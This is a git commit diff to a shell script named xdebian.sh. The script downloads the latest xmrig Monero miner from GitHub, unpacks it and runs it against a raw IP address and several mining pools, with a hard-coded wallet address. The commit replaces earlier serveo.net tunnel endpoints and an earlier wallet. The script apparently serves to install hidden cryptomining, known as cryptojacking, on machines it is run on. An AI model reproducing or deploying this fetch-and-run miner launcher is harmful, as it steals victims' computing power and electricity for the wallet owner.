b7982c6cee4da9df6a15b2a3058e3ef9dca463cc
afghanamster <afghanamster@gmail.com>
2024-12-06 11:52:11 +0000

    init

--- scripts/xdebian.sh
+++ scripts/xdebian.sh
@@ -4,4 +4,5 @@ curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*
 mkdir xm
 tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
-./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o serveo.net:44444 --nicehash -o serveo.net:33333 --nicehash -o serveo.net:22222 --nicehash -o serveo.net:11111 --nicehash -o pool.supportxmr.com:3333 -u 86x4EkchvMLLZcL16bG25rJCRRukq5MYyT1fhUq2bAFP1fD9hLVCgNY8tC3wknFVW9BPsv6xSJWBa8ofyscqLe1j7xvg9Uz -p hash1 -k
+./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o 84.32.248.177:3333 --nicehash -o pool.supportxmr.com:443 --nicehash -o monerohash.com:9999 --nicehash -o  pool.supportxmr.com:3333 -u 47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV -p hash1 -k
+
